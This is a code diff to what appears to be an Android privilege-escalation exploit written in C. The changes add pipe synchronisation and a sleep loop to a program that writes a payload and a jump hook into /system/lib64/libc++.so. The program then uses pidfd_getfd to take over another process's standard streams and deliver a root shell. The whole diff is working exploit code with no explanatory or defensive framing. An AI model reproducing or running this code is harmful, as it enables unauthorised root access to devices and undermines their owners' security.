@@ -198,6 +198,15 @@ int main(int argc, char **argv) {
 	fwrite(&pid, sizeof(pid), 1, fp);
 	fclose(fp);
 
+	// set up pipe for synchronizing root processes
+	int pipe_fds[2] = { 0 };
+	SYSCHK(pipe(pipe_fds));
+	SYSCHK(dup2(pipe_fds[1], 16));
+	SYSCHK(dup2(pipe_fds[0], 15));
+	char pipe_input = 0;
+	write(pipe_fds[1], &pipe_input, 1);
+
+
 	int fd = SYSCHK(open("/system/lib64/libc++.so", O_RDONLY));
 	write_file(fd, PAYLOAD_ADDR, PAYLOAD, sizeof(PAYLOAD));
 	write_file(fd, HOOK_ADDR, JMP_SHIM, sizeof(JMP_SHIM));
@@ -211,6 +220,11 @@ int main(int argc, char **argv) {
 	while (access("/data/local/tmp/root_done", F_OK) != 0) {}
 	puts("root_done file found");
 	SYSCHK(unlink("/data/local/tmp/root_done"));
+
+	// sleep forever, so root shell takes over
+	for (;;) {
+		sleep(20);
+	}
 
 	return 0;
 }
@@ -237,9 +251,13 @@ void root_shell() {
 	int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
 	int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
 	int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
+	int pipe_fd = syscall(SYS_pidfd_getfd, pfd, 15, 0);
 	dup2(stdinfd, 0);
 	dup2(stdoutfd, 1);
 	dup2(stderrfd, 2);
+
+	char pipe_output = 0;
+	read(pipe_fd, &pipe_output, 1);
 
 	fp = fopen("/data/local/tmp/root_done", "w");
 	char *s = "OK";
